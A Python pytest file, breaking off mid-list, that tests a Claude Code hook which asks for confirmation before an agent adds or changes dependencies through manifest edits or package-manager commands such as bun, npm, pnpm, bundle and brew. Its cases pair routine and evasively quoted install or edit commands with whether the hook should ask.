# Copyright © 2026 Michael Shields
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# Exercises .claude/hooks/dependency_guard.py end to end: each case writes a
# manifest, feeds the hook the PreToolUse payload a real tool call would send,
# and checks whether it asked. The point of the hook is precision, so the
# negative cases (routine edits that must stay silent) matter as much as the
# positive ones.

import json
import resource
import subprocess
import sys
from pathlib import Path
from typing import TYPE_CHECKING, NamedTuple, cast

import pytest

if TYPE_CHECKING:
    from collections.abc import Mapping

REPO = Path(__file__).resolve().parents[1]
HOOK = REPO / ".claude" / "hooks" / "dependency_guard.py"

PYPROJECT = """\
[project]
name = "dotfiles"
version = "0.1.0"
dependencies = [
    "pillow>=12.3.0",
]

[dependency-groups]
dev = [
    "ruff>=0.15.7",
]

[tool.ruff]
line-length = 100
"""

PACKAGE_JSON = """\
{
  "type": "module",
  "dependencies": { "colorjs.io": "0.6.1" },
  "devDependencies": { "typescript": "^5.4.3" },
  "scripts": { "build": "tsc --noEmit" }
}
"""

CARGO = """\
[package]
name = "x"
version = "0.1.0"

[dependencies]
serde = "1"

[profile.release]
lto = true
"""

GO_MOD = """\
module example.com/x

go 1.26

require (
\texample.com/a v1.0.0
\texample.com/b v2.0.0 // indirect
)
"""

# Same distribution pinned twice, once per environment marker.
PYPROJECT_DUP = """\
[project]
name = "x"
dependencies = [
    "numpy==1.26; python_version < '3.13'",
    "numpy==2.0; python_version >= '3.13'",
]
"""


class Case(NamedTuple):
    label: str
    filename: str
    before: str
    tool_input: dict[str, object]
    ask: bool
    tool: str = "Edit"


def edit(old: str, new: str, **extra: object) -> dict[str, object]:
    return {"old_string": old, "new_string": new, **extra}


CASES = (
    # pyproject.toml
    Case(
        "pyproject: dependency added",
        "pyproject.toml",
        PYPROJECT,
        edit('    "pillow>=12.3.0",', '    "pillow>=12.3.0",\n    "requests>=2",'),
        ask=True,
    ),
    Case(
        "pyproject: version bumped",
        "pyproject.toml",
        PYPROJECT,
        edit('"pillow>=12.3.0"', '"pillow>=12.4.0"'),
        ask=True,
    ),
    Case(
        "pyproject: dependency group gains an entry",
        "pyproject.toml",
        PYPROJECT,
        edit('    "ruff>=0.15.7",', '    "ruff>=0.15.7",\n    "ty>=0.0.19",'),
        ask=True,
    ),
    Case(
        "pyproject: extra index url added",
        "pyproject.toml",
        PYPROJECT,
        edit(
            "[tool.ruff]",
            '[tool.uv]\nextra-index-url = ["https://example.invalid"]\n\n[tool.ruff]',
        ),
        ask=True,
    ),
    Case(
        "pyproject: version bumped on one of two same-named deps",
        "pyproject.toml",
        PYPROJECT_DUP,
        edit("numpy==1.26", "numpy==1.27"),
        ask=True,
    ),
    Case(
        "pyproject: unrelated tool config edited",
        "pyproject.toml",
        PYPROJECT,
        edit("line-length = 100", "line-length = 88"),
        ask=False,
    ),
    Case(
        "pyproject: dependency removed",
        "pyproject.toml",
        PYPROJECT,
        edit('    "pillow>=12.3.0",\n', ""),
        ask=False,
    ),
    Case(
        "pyproject: comment added",
        "pyproject.toml",
        PYPROJECT,
        edit("[tool.ruff]", "# Formatting.\n[tool.ruff]"),
        ask=False,
    ),
    Case(
        "pyproject: result is malformed toml",
        "pyproject.toml",
        PYPROJECT,
        edit("[tool.ruff]", "[tool.ruff"),
        ask=True,
    ),
    Case(
        "pyproject: old_string not present",
        "pyproject.toml",
        PYPROJECT,
        edit("no such text anywhere", "x"),
        ask=True,
    ),
    Case(
        "pyproject: replace_all across entries",
        "pyproject.toml",
        PYPROJECT,
        edit(">=", "==", replace_all=True),
        ask=True,
    ),
    # package.json
    Case(
        "package.json: devDependency added",
        "package.json",
        PACKAGE_JSON,
        edit('"typescript": "^5.4.3"', '"typescript": "^5.4.3", "vitest": "^2"'),
        ask=True,
    ),
    Case(
        "package.json: dependency version changed",
        "package.json",
        PACKAGE_JSON,
        edit('"colorjs.io": "0.6.1"', '"colorjs.io": "0.7.0"'),
        ask=True,
    ),
    Case(
        "package.json: trustedDependencies added",
        "package.json",
        PACKAGE_JSON,
        edit(
            '"type": "module",',
            '"type": "module",\n  "trustedDependencies": ["esbuild"],',
        ),
        ask=True,
    ),
    Case(
        "package.json: script changed",
        "package.json",
        PACKAGE_JSON,
        edit('"build": "tsc --noEmit"', '"build": "tsc --noEmit --strict"'),
        ask=False,
    ),
    # Cargo.toml
    Case(
        "Cargo.toml: dependency added",
        "Cargo.toml",
        CARGO,
        edit('serde = "1"', 'serde = "1"\ntokio = "1"'),
        ask=True,
    ),
    Case(
        "Cargo.toml: target dependency added",
        "Cargo.toml",
        CARGO,
        edit(
            "[profile.release]",
            "[target.'cfg(unix)'.dependencies]\nlibc = \"0.2\"\n\n[profile.release]",
        ),
        ask=True,
    ),
    Case(
        "Cargo.toml: string spec rewritten as inline table",
        "Cargo.toml",
        CARGO,
        edit('serde = "1"', 'serde = { version = "1" }'),
        ask=False,
    ),
    Case(
        "Cargo.toml: profile edited",
        "Cargo.toml",
        CARGO,
        edit("lto = true", "lto = false"),
        ask=False,
    ),
    # go.mod
    Case(
        "go.mod: require added",
        "go.mod",
        GO_MOD,
        edit(
            "\texample.com/a v1.0.0", "\texample.com/a v1.0.0\n\texample.com/c v3.0.0"
        ),
        ask=True,
    ),
    Case(
        "go.mod: version bumped",
        "go.mod",
        GO_MOD,
        edit("example.com/a v1.0.0", "example.com/a v1.1.0"),
        ask=True,
    ),
    Case(
        "go.mod: tool directive added",
        "go.mod",
        GO_MOD,
        edit("go 1.26", "go 1.26\n\ntool golang.org/x/tools/cmd/stringer"),
        ask=True,
    ),
    Case(
        "go.mod: replace added",
        "go.mod",
        GO_MOD,
        edit("go 1.26", "go 1.26\n\nreplace example.com/a => example.com/fork v1.0.0"),
        ask=True,
    ),
    Case(
        "go.mod: indirect marker added",
        "go.mod",
        GO_MOD,
        edit("example.com/a v1.0.0", "example.com/a v1.0.0 // indirect"),
        ask=False,
    ),
    Case(
        "go.mod: go directive bumped",
        "go.mod",
        GO_MOD,
        edit("go 1.26", "go 1.27"),
        ask=False,
    ),
    Case(
        "go.mod: require removed",
        "go.mod",
        GO_MOD,
        edit("\texample.com/b v2.0.0 // indirect\n", ""),
        ask=False,
    ),
    Case(
        "go.mod: single-line require separated by a tab",
        "go.mod",
        GO_MOD,
        edit("go 1.26", "go 1.26\n\nrequire\texample.com/x v1.0.0"),
        ask=True,
    ),
    # Write, including to a file that does not exist yet.
    Case(
        "write: new manifest declaring a dependency",
        "",
        "",
        {"content": '[project]\nname = "x"\ndependencies = ["requests"]\n'},
        ask=True,
        tool="Write",
    ),
    Case(
        "write: new manifest with no dependencies",
        "",
        "",
        {"content": '[project]\nname = "x"\n\n[tool.ruff]\nline-length = 100\n'},
        ask=False,
        tool="Write",
    ),
    Case(
        "write: overwrite leaving dependencies unchanged",
        "pyproject.toml",
        PYPROJECT,
        {"content": PYPROJECT.replace("line-length = 100", "line-length = 88")},
        ask=False,
        tool="Write",
    ),
    Case(
        "write: manifest with no string content fails closed",
        "pyproject.toml",
        PYPROJECT,
        {},
        ask=True,
        tool="Write",
    ),
    # Files the hook has no opinion about.
    Case(
        "unguarded file is ignored",
        "README.md",
        "# hi\n",
        edit("# hi", "# hello"),
        ask=False,
    ),
)


class BashCase(NamedTuple):
    label: str
    command: str
    ask: bool
    tool: str = "Bash"


VETTED_INSTALLS = [
    "bun install --frozen-lockfile",
    "pnpm install --frozen-lockfile",
    "npm install --no-audit",
    "bundle install --quiet",
]

BASH_CASES: tuple[BashCase, ...] = (
    BashCase(
        "append to requirements.txt", "echo 'requests' >> requirements.txt", ask=True
    ),
    BashCase(
        "heredoc into pyproject.toml",
        "cat > pyproject.toml <<'EOF'\n[project]\nEOF",
        ask=True,
    ),
    BashCase("sed -i on go.mod", "sed -i '' 's/a/b/' go.mod", ask=True),
    BashCase("tee into Brewfile", "echo 'brew \"jq\"' | tee -a Brewfile", ask=True),
    BashCase(
        "python writes go.mod",
        "python3 -c \"open('go.mod','a').write('x')\"",
        ask=True,
    ),
    # GNU sed spells the in-place flag more ways than BSD sed does.
    BashCase("sed -i.bak on Cargo.toml", "sed -i.bak 's/a/b/' Cargo.toml", ask=True),
    BashCase("sed -Ei on pyproject.toml", "sed -Ei 's/a/b/' pyproject.toml", ask=True),
    BashCase("sed -ni on package.json", "sed -ni 's/a/b/p' package.json", ask=True),
    BashCase(
        "sed -i after other flags",
        "sed -E -n -i 's/a/b/p' pyproject.toml",
        ask=True,
    ),
    BashCase("sed --in-place on go.mod", "sed --in-place 's/a/b/' go.mod", ask=True),
    BashCase(
        "sed --in-place with a suffix on go.sum",
        "sed --in-place=.orig 's/a/b/' go.sum",
        ask=True,
    ),
    BashCase(
        "sed abbreviates --in-place",
        "sed --in-pl 's/a/b/' package-lock.json",
        ask=True,
    ),
    BashCase("sed -i after the file", "sed 's/a/b/' go.mod -i", ask=True),
    BashCase("Homebrew gsed -i on go.mod", "gsed -i 's/a/b/' go.mod", ask=True),
    BashCase("Homebrew gsed -Ei on Cargo.toml", "gsed -Ei s/a/b/ Cargo.toml", ask=True),
    BashCase(
        "sed --in-place after the file", "sed 's/a/b/' go.mod --in-place", ask=True
    ),
    BashCase("BSD sed -I on uv.lock", "sed -I '' 's/a/b/' uv.lock", ask=True),
    BashCase("BSD sed -nI on yarn.lock", "sed -nI '' 's/a/b/p' yarn.lock", ask=True),
    BashCase(
        "tee into a module Brewfile",
        "echo 'brew \"jq\"' | tee brew/dev.Brewfile",
        ask=True,
    ),
    BashCase(
        "redirect into a module Brewfile",
        "echo 'brew \"jq\"' > brew/base.Brewfile",
        ask=True,
    ),
    BashCase(
        "append to a module Brewfile",
        "echo 'brew \"jq\"' >> brew/cloud.Brewfile",
        ask=True,
    ),
    BashCase(
        "heredoc into a module Brewfile",
        "cat > brew/data.Brewfile <<'EOF'\nbrew \"duckdb\"\nEOF",
        ask=True,
    ),
    BashCase(
        "sed -i on a module Brewfile",
        "sed -i s/a/b/ brew/macos.Brewfile",
        ask=True,
    ),
    BashCase(
        "GNU sed -Ei on a module Brewfile",
        "sed -Ei 's/a/b/' brew/linux.Brewfile",
        ask=True,
    ),
    BashCase("reading a manifest", "cat pyproject.toml", ask=False),
    BashCase("grepping a manifest", "grep pillow pyproject.toml", ask=False),
    BashCase("reading a module Brewfile", "cat brew/dev.Brewfile", ask=False),
    BashCase(
        "grepping a module Brewfile", "grep -n ripgrep brew/base.Brewfile", ask=False
    ),
    BashCase(
        "sed without in-place on a manifest",
        "sed -n 's/a/b/p' go.mod",
        ask=False,
    ),
    BashCase(
        "sed -E without in-place on a manifest",
        "sed -E 's/a/b/' pyproject.toml",
        ask=False,
    ),
    BashCase(
        "sed long options without in-place on a manifest",
        "sed --quiet --expression='s/a/b/p' package.json",
        ask=False,
    ),
    BashCase(
        "sed -e script on a module Brewfile",
        "sed -e 's/a/b/' brew/dev.Brewfile",
        ask=False,
    ),
    BashCase("gsed without in-place on a manifest", "gsed -n p go.mod", ask=False),
    BashCase(
        "sed in place on an unguarded file", "sed -Ei 's/a/b/' src/app.py", ask=False
    ),
    BashCase(
        "sed in place elsewhere, manifest read in the next command",
        "sed -i 's/a/b/' notes.txt && cat go.mod",
        ask=False,
    ),
    BashCase("sed over many manifest mentions", "sed go.mod " * 800, ask=False),
    BashCase("sed with a very long token", "sed -n p " + "a" * 64_000, ask=False),
    BashCase("sed -i with a very long token", "sed -i p " + "a" * 64_000, ask=False),
    BashCase("redirect with a very long token", "echo x > " + "a" * 64_000, ask=False),
    BashCase(
        "manifest write after a very long token",
        "sed -i p " + "a" * 64_000 + "\nsed -i s/a/b/ go.mod",
        ask=True,
    ),
    BashCase("unrelated redirect", "make lint > /tmp/out.txt", ask=False),
    BashCase("ordinary command", "uv run pytest -q", ask=False),
    # bun install
    BashCase("bun install without arguments", "bun install", ask=False),
    BashCase("bun i without arguments", "bun i", ask=False),
    BashCase(
        "bun install --frozen-lockfile", "bun install --frozen-lockfile", ask=False
    ),
    BashCase(
        "bun install with several vetted flags",
        "bun install --frozen-lockfile --production --ignore-scripts -p",
        ask=False,
    ),
    BashCase("bun install --cwd=dir", "bun install --cwd=app", ask=False),
    BashCase("bun install --omit=dev", "bun install --omit=dev", ask=False),
    BashCase(
        "bun by absolute path", "/opt/homebrew/bin/bun install --silent", ask=False
    ),
    BashCase(
        "bun install in a command chain",
        "cd app && bun install --frozen-lockfile && make test lint",
        ask=False,
    ),
    BashCase(
        "bun install piped with stderr merged",
        "bun install --frozen-lockfile 2>&1 | tail -20",
        ask=False,
    ),
    BashCase("bun install with output discarded", "bun install > /dev/null", ask=False),
    BashCase("bun install with &> redirect", "bun install &>/dev/null", ask=False),
    BashCase("bun install in the background", "bun install --silent &", ask=False),
    BashCase(
        "bun install inside sh -c",
        "docker run --rm img zsh -c 'bun install --frozen-lockfile && make test'",
        ask=False,
    ),
    BashCase("brew install bun", "brew install bun", ask=False),
    BashCase("bun run build", "bun run build", ask=False),
    BashCase("bun test", "bun test src/install.test.ts", ask=False),
    BashCase("bun install -p repeated", "bun install -p;" * 5_000, ask=False),
    BashCase("bun install package", "bun install left-pad", ask=True),
    BashCase("bun i package", "bun i left-pad", ask=True),
    BashCase("bun install pinned package", "bun install left-pad@1.3.0", ask=True),
    BashCase("bun install scoped package", "bun install @types/node", ask=True),
    BashCase(
        "bun install package after vetted flags",
        "bun install --frozen-lockfile left-pad",
        ask=True,
    ),
    BashCase("bun install --dev package", "bun install --dev typescript", ask=True),
    BashCase("bun install -d package", "bun install -d typescript", ask=True),
    BashCase("bun install --trust package", "bun install --trust esbuild", ask=True),
    BashCase("bun install --global", "bun install --global", ask=True),
    BashCase("bun install -g", "bun install -g", ask=True),
    BashCase("bun install --analyze", "bun install --analyze src/main.ts", ask=True),
    BashCase("bun install --force", "bun install --force", ask=True),
    BashCase(
        "bun install --registry",
        "bun install --registry=https://registry.example.com",
        ask=True,
    ),
    BashCase(
        "bun install --cwd with a separate value", "bun install --cwd app", ask=True
    ),
    BashCase("bun install an unknown flag", "bun install --no-such-flag", ask=True),
    BashCase("bun install a variable", "bun install $PKG", ask=True),
    BashCase("bun install a quoted package", "bun install 'left-pad'", ask=True),
    BashCase(
        "bun install a quoted flag and package",
        'bun install "--production" "left-pad"',
        ask=True,
    ),
    BashCase(
        "bun install package by absolute path",
        "/usr/local/bin/bun install left-pad",
        ask=True,
    ),
    BashCase(
        "bun install package after cd", "cd app && bun install left-pad", ask=True
    ),
    BashCase(
        "bun install package after a safe install",
        "bun install --frozen-lockfile; bun install left-pad",
        ask=True,
    ),
    BashCase(
        "bun install package after an env prefix",
        "env CI=1 bun install left-pad",
        ask=True,
    ),
    BashCase("bun install package under time", "time bun install left-pad", ask=True),
    BashCase("bun install package in a subshell", "(bun install left-pad)", ask=True),
    BashCase(
        "bun install package in a command substitution",
        "echo $(bun install left-pad)",
        ask=True,
    ),
    BashCase(
        "bun install package in backticks", "echo `bun install left-pad`", ask=True
    ),
    BashCase(
        "bun install package after a global flag",
        "bun --cwd=app install left-pad",
        ask=True,
    ),
    BashCase(
        "bun install package inside sh -c",
        "sh -c 'bun install left-pad'",
        ask=True,
    ),
    BashCase(
        "bun install package behind a quoted subcommand",
        "bun 'install' left-pad",
        ask=True,
    ),
    BashCase(
        "bun install package on a continued line",
        "bun install \\\n  left-pad",
        ask=True,
    ),
    BashCase(
        "bun install package after a redirect",
        "bun install > out.txt left-pad",
        ask=True,
    ),
    BashCase(
        "bun install package before a redirect",
        "bun install left-pad 2>&1 | tail",
        ask=True,
    ),
    BashCase(
        "bun install a very long argument", "bun install " + "a" * 64_000, ask=True
    ),
    BashCase(
        "bun install a very long digit run", "bun install " + "1" * 64_000, ask=True
    ),
    # npm
    BashCase("npm install without arguments", "npm install", ask=False),
    BashCase("npm i without arguments", "npm i", ask=False),
    BashCase(
        "npm install with vetted flags",
        "npm install --no-audit --no-fund --ignore-scripts --omit=dev",
        ask=False,
    ),
    BashCase("npm install --prefix=dir", "npm install --prefix=app", ask=False),
    BashCase("npm install alias", "npm isntall", ask=False),
    BashCase(
        "npm install piped with stderr merged",
        "cd app && npm install --no-audit 2>&1 | tail -5",
        ask=False,
    ),
    BashCase("npm ci", "npm ci", ask=False),
    BashCase("npm run build", "npm run build", ask=False),
    BashCase("npm test", "npm test -- --watch=false", ask=False),
    BashCase("npm install package", "npm install left-pad", ask=True),
    BashCase("npm i package", "npm i left-pad", ask=True),
    BashCase("npm i -D package", "npm i -D typescript", ask=True),
    BashCase("npm install --save-dev package", "npm install --save-dev x", ask=True),
    BashCase("npm install -g", "npm i -g bun", ask=True),
    BashCase("npm install a git URL", "npm install git+https://x.test/y.git", ask=True),
    BashCase("npm install a local path", "npm install ./vendor/x", ask=True),
    BashCase(
        "npm install --registry", "npm install --registry=https://x.test", ask=True
    ),
    BashCase("npm install package by alias", "npm isntall left-pad", ask=True),
    BashCase("npm install package by short alias", "npm in left-pad", ask=True),
    BashCase(
        "npm install package after vetted flags",
        "npm install --no-audit left-pad",
        ask=True,
    ),
    BashCase("npm install --omit with a separate value", "npm i --omit dev", ask=True),
    BashCase("npm install package after cd", "cd app && npm i left-pad", ask=True),
    # pnpm
    BashCase("pnpm install without arguments", "pnpm install", ask=False),
    BashCase("pnpm i without arguments", "pnpm i", ask=False),
    BashCase(
        "pnpm install --frozen-lockfile", "pnpm install --frozen-lockfile", ask=False
    ),
    BashCase(
        "pnpm install with several vetted flags",
        "pnpm install --prod --ignore-scripts --prefer-offline -r",
        ask=False,
    ),
    BashCase("pnpm recursive install", "pnpm -r install", ask=False),
    BashCase("pnpm filtered install", "pnpm --filter=app install", ask=False),
    BashCase("pnpm run build", "pnpm run build", ask=False),
    BashCase("pnpm install package", "pnpm install left-pad", ask=True),
    BashCase("pnpm i package", "pnpm i left-pad", ask=True),
    BashCase("pnpm i -D package", "pnpm i -D typescript", ask=True),
    BashCase("pnpm i -g", "pnpm i -g typescript", ask=True),
    BashCase("pnpm -r install package", "pnpm -r install left-pad", ask=True),
    BashCase(
        "pnpm install --registry", "pnpm install --registry=https://x.test", ask=True
    ),
    # bundle
    BashCase("bundle install without arguments", "bundle install", ask=False),
    BashCase(
        "bundle install with vetted flags",
        "bundle install --frozen --quiet --jobs=4 --without=development",
        ask=False,
    ),
    BashCase("bundle install --deployment", "bundle install --deployment", ask=False),
    BashCase("bundle exec rspec", "bundle exec rspec spec/", ask=False),
    BashCase(
        "bundle install --gemfile", "bundle install --gemfile=x/Gemfile", ask=True
    ),
    BashCase(
        "bundle install --path with a separate value",
        "bundle install --path vendor/bundle",
        ask=True,
    ),
    BashCase("bundle install an unknown flag", "bundle install --system", ask=True),
    # brew bundle
    BashCase("brew bundle", "brew bundle", ask=False),
    BashCase("brew bundle install", "brew bundle install", ask=False),
    BashCase(
        "brew bundle with vetted flags",
        "brew bundle --force --no-upgrade --upgrade-formulae=a,b",
        ask=False,
    ),
    BashCase(
        "brew bundle with an expanded flag value",
        'brew bundle --force --upgrade-formulae="$formulae" | (grep -v x || true)',
        ask=True,
    ),
    BashCase("brew bundle install --verbose", "brew bundle install -v", ask=False),
    BashCase("brew install a formula", "brew install jq", ask=False),
    BashCase(
        "brew bundle add",
        "brew bundle add --file=brew/dev.Brewfile ripgrep",
        ask=True,
    ),
    BashCase("brew bundle remove", "brew bundle remove ripgrep", ask=True),
    BashCase("brew bundle dump", "brew bundle dump --force", ask=True),
    BashCase("brew bundle cleanup", "brew bundle cleanup --force", ask=True),
    BashCase("brew bundle check", "brew bundle check --verbose", ask=True),
    BashCase("brew bundle exec", "brew bundle exec -- make", ask=True),
    BashCase("brew bundle --file", "brew bundle --file=brew/dev.Brewfile", ask=True),
    BashCase("brew bundle --file=-", "brew bundle --file=-", ask=True),
    BashCase("brew bundle --global", "brew bundle --global", ask=True),
    BashCase(
        "brew bundle after env prefix",
        "HOMEBREW_NO_AUTO_UPDATE=1 brew bundle cleanup",
        ask=True,
    ),
    # Different tools in one command line are judged separately.
    BashCase(
        "safe installs of several tools",
        " && ".join(VETTED_INSTALLS),
        ask=False,
    ),
    BashCase(
        "a package install after safe installs of other tools",
        "bun install && npm install && pnpm i left-pad",
        ask=True,
    ),
    # Substitutions can supply the packages, or split a flag value from them.
    BashCase("package list from backticks", "bun install `cat pkgs.txt`", ask=True),
    BashCase(
        "package list from backticks after a flag",
        "npm install --no-audit `echo left-pad`",
        ask=True,
    ),
    BashCase("package list from $(...)", "pnpm i $(cat pkgs.txt)", ask=True),
    BashCase("package list from <(...)", "bun install <(cat pkgs.txt)", ask=True),
    BashCase(
        "package after a substituted flag value",
        'bun install --cwd="$(git rev-parse --show-toplevel)" left-pad',
        ask=True,
    ),
    BashCase(
        "package after a substituted global flag value",
        'bun --cwd "$(git rev-parse --show-toplevel)" install left-pad',
        ask=True,
    ),
    BashCase(
        "package after a quoted separator in a flag value",
        "bun install --cwd='a;b' left-pad",
        ask=True,
    ),
    BashCase(
        "package after a quoted separator in a global flag value",
        "bun --cwd 'a;b' install left-pad",
        ask=True,
    ),
    BashCase("flag value from a variable", "bun install --omit=$KINDS", ask=True),
    BashCase(
        "package after a clobbering redirect",
        "bun install >| out.log left-pad",
        ask=True,
    ),
    BashCase(
        "quoted redirect characters are arguments",
        "bun install '>' left-pad",
        ask=True,
    ),
    BashCase(
        "clobbering redirect after a vetted flag",
        "bun install --frozen-lockfile >| out.log",
        ask=False,
    ),
    BashCase(
        "substitution that is itself an install",
        "echo $(bun install --frozen-lockfile)",
        ask=False,
    ),
    BashCase("install in a subshell", "(cd app && npm install --no-audit)", ask=False),
    BashCase(
        "directory from a substitution before the install",
        'cd "$(git rev-parse --show-toplevel)" && bun install --frozen-lockfile',
        ask=False,
    ),
    BashCase(
        "trailing comment",
        "bun install --frozen-lockfile # restore deps",
        ask=False,
    ),
    BashCase("trailing comment alone", "npm install # it's fine", ask=False),
    BashCase("# inside a word is not a comment", "npm install left-pad#v1", ask=True),
    BashCase("install help", "bun install --help", ask=False),
    # Only the install subcommand is checked.
    BashCase("bun test filtered by name", "bun test install --bail", ask=False),
    BashCase("npm run with an install-like script", "npm run install foo", ask=False),
    BashCase("bundle exec rake install", "bundle exec rake install", ask=False),
    BashCase("a flag before the subcommand", "pnpm -r install left-pad", ask=True),
    BashCase(
        "a flag value before the subcommand", "bun --cwd app i left-pad", ask=True
    ),
    # Text that only mentions an install.
    BashCase("grep for an install", 'grep -rn "bun install" .', ask=False),
    BashCase(
        "rg --pre runs its argument", "rg --pre 'npm install left-pad' x .", ask=True
    ),
    BashCase("echo of an install", "echo bun install failed", ask=False),
    BashCase("pipe into grep", "make help | grep 'pnpm install' README.md", ask=False),
    BashCase("grep, then install", "grep -q x f && npm install left-pad", ask=True),
    # Monitor runs commands through the same permission path as Bash.
    BashCase(
        "package install via Monitor", "bun install left-pad", ask=True, tool="Monitor"
    ),
    BashCase(
        "vetted install via Monitor",
        "bun install --frozen-lockfile",
        ask=False,
        tool="Monitor",
    ),
    BashCase(
        "manifest write via Monitor",
        "echo '{}' > package.json",
        ask=True,
        tool="Monitor",
    ),
    # A manager's name that is not the command: an image, an env value, a
    # redirect target, or another manager's runner.
    BashCase(
        "install in an image whose name ends in bun",
        "docker run --rm -v $PWD:/app -w /app oven/bun bun install left-pad",
        ask=True,
    ),
    BashCase(
        "install after an env value ending in pnpm",
        "PNPM_HOME=$HOME/Library/pnpm pnpm i left-pad",
        ask=True,
    ),
    BashCase(
        "install after an env value ending in npm",
        "npm_config_cache=/tmp/npm npm install left-pad",
        ask=True,
    ),
    BashCase(
        "install after BUN_INSTALL", "BUN_INSTALL=/opt/bun bun i left-pad", ask=True
    ),
    BashCase(
        "install after a redirect target ending in npm",
        "2>/tmp/npm npm install left-pad",
        ask=True,
    ),
    BashCase(
        "install in a container named bun",
        "docker exec bun npm install left-pad",
        ask=True,
    ),
    BashCase("pnpm exec npm install", "pnpm exec npm install left-pad", ask=True),
    BashCase("bundle exec npm install", "bundle exec npm install left-pad", ask=True),
    BashCase(
        "manager behind a flag value",
        "docker run -v x:/brew --rm npm install left-pad",
        ask=True,
    ),
    BashCase(
        "vetted install in an image named bun",
        "docker run --rm oven/bun bun install --frozen-lockfile",
        ask=False,
    ),
    BashCase(
        "vetted install after PNPM_HOME",
        "PNPM_HOME=$HOME/Library/pnpm pnpm install --frozen-lockfile",
        ask=False,
    ),
    BashCase(
        "vetted install after npm_config_cache",
        "npm_config_cache=/tmp/npm npm install --no-audit",
        ask=False,
    ),
    BashCase("brew list of managers", "brew list bun npm pnpm", ask=False),
    BashCase("npm uninstall bun", "npm uninstall bun", ask=False),
    BashCase("pn alias", "pn i left-pad", ask=True),
    BashCase("pn alias vetted", "pn install --frozen-lockfile", ask=False),
    BashCase("bundler alias", "bundler install left-pad", ask=True),
    BashCase("bundler alias vetted", "bundler install --quiet", ask=False),
    # An add names a package; a flag before it hides it from the ask rules.
    BashCase("pnpm --filter add", "pnpm --filter web add zod", ask=True),
    BashCase("pnpm -C add", "pnpm -C dir add left-pad", ask=True),
    BashCase("npm -w add", "npm -w app add left-pad", ask=True),
    BashCase("npm --prefix add", "npm --prefix app add left-pad", ask=True),
    BashCase("bun --cwd add", "bun --cwd apps/web add zod", ask=True),
    BashCase("bun add", "bun add left-pad", ask=True),
    BashCase("bundler add", "bundler add rack", ask=True),
    BashCase("bundle inject", "bundle inject rack 1.0", ask=True),
    BashCase("npm install-test", "npm install-test left-pad", ask=True),
    BashCase("npm it", "npm it left-pad", ask=True),
    BashCase("pnpm it", "pnpm it left-pad", ask=True),
    BashCase("pnpm run add script", "pnpm --filter web run add", ask=False),
    BashCase("bun test with a flag", "bun --cwd app test", ask=False),
    BashCase("npm run add script", "npm run add", ask=False),
    # Variables that select a different manifest.
    BashCase(
        "HOMEBREW_BUNDLE_FILE",
        "HOMEBREW_BUNDLE_FILE=/tmp/Brewfile brew bundle",
        ask=True,
    ),
    BashCase(
        "HOMEBREW_BUNDLE_FILE through env",
        "env HOMEBREW_BUNDLE_FILE=./Brewfile.new brew bundle install",
        ask=True,
    ),
    BashCase(
        "HOMEBREW_BUNDLE_FILE exported earlier",
        "export HOMEBREW_BUNDLE_FILE=/tmp/deps.rb; brew bundle install",
        ask=True,
    ),
    BashCase(
        "BUNDLE_GEMFILE",
        "BUNDLE_GEMFILE=gemfiles/x.gemfile bundle install",
        ask=True,
    ),
    BashCase(
        "unrelated Homebrew variable",
        "HOMEBREW_NO_AUTO_UPDATE=1 brew bundle",
        ask=False,
    ),
    BashCase(
        "unrelated Bundler variable",
        "BUNDLE_DEPLOYMENT=true bundle install",
        ask=False,
    ),
    BashCase(
        "BUNDLE_GEMFILE without an install",
        "BUNDLE_GEMFILE=x/Gemfile bundle exec rspec",
        ask=False,
    ),
    BashCase(
        "HOMEBREW_BUNDLE_FILE_GLOBAL",
        "HOMEBREW_BUNDLE_FILE_GLOBAL=/tmp/g.rb brew bundle",
        ask=False,
    ),
    # An even run of backslashes before a newline is an escaped backslash.
    BashCase(
        "escaped backslash before a newline",
        "echo hi\\\\\nnpm install left-pad",
        ask=True,
    ),
    BashCase(
        "continued line after echo",
        "echo hi \\\nnpm install left-pad",
        ask=False,
    ),
    BashCase(
        "comment ending in a backslash",
        "echo hi # note \\\nnpm install left-pad",
        ask=True,
    ),
    BashCase(
        "comment line ending in a backslash",
        "# note \\\nnpm install left-pad",
        ask=True,
    ),
    BashCase(
        "continuation after a quoted hash",
        'echo "a #"; npm \\\ninstall left-pad',
        ask=True,
    ),
    # Text that mentions an install.
    BashCase(
        "comment line before a command",
        "# Run bun install to refresh the lockfile\nbun test",
        ask=False,
    ),
    BashCase(
        "comment line before an install",
        "# refresh\nbun install left-pad",
        ask=True,
    ),
    BashCase(
        "echo inside if/then",
        'if [ ! -d node_modules ]; then echo "Run npm install first"; fi',
        ask=False,
    ),
    BashCase(
        "echo inside a loop", 'for d in a b; do echo "npm install x"; done', ask=False
    ),
    BashCase(
        "parenthesis in a trailing comment",
        "bun install --frozen-lockfile  # installs from bun.lock (no network)",
        ask=False,
    ),
    BashCase("echo with backticks around brew", "echo `brew --prefix`", ask=False),
    BashCase("install in closing backticks", "echo `bun install`", ask=False),
    # Redirections and quoted flag values.
    BashCase(
        "csh-style redirect", "bun install --frozen-lockfile >& /tmp/out.log", ask=False
    ),
    BashCase("csh-style redirect after npm", "npm install >& /tmp/log", ask=False),
    BashCase(
        "quoted flag value before the subcommand",
        'pnpm --filter "@acme/web" install',
        ask=False,
    ),
    BashCase(
        "quoted flag value before another subcommand",
        "pnpm --filter '@scope/web' build",
        ask=False,
    ),
    BashCase(
        "subcommand from a substitution",
        'npm "$(echo install)" left-pad',
        ask=True,
    ),
    BashCase("subcommand from $(...)", "npm $(echo install) left-pad", ask=True),
    BashCase("subcommand from a variable", "npm $CMD left-pad", ask=True),
    # Packages supplied on standard input.
    BashCase("xargs install", "echo left-pad | xargs npm install", ask=True),
    BashCase("xargs install from a file", "xargs bun i < pkgs.txt", ask=True),
    BashCase("xargs install with flags", "xargs -n1 -P4 pnpm install", ask=True),
    BashCase("xargs by path", "cat p.txt | /usr/bin/xargs bun install", ask=True),
    BashCase("xargs behind env", "env CI=1 xargs npm i < pkgs.txt", ask=True),
    BashCase("parallel install", "cat pkgs.txt | parallel npm install", ask=True),
    BashCase("xargs of something else", "git ls-files | xargs grep foo", ask=False),
    BashCase(
        "xargs before a vetted install",
        "git ls-files | xargs rm -f && npm install --no-audit",
        ask=False,
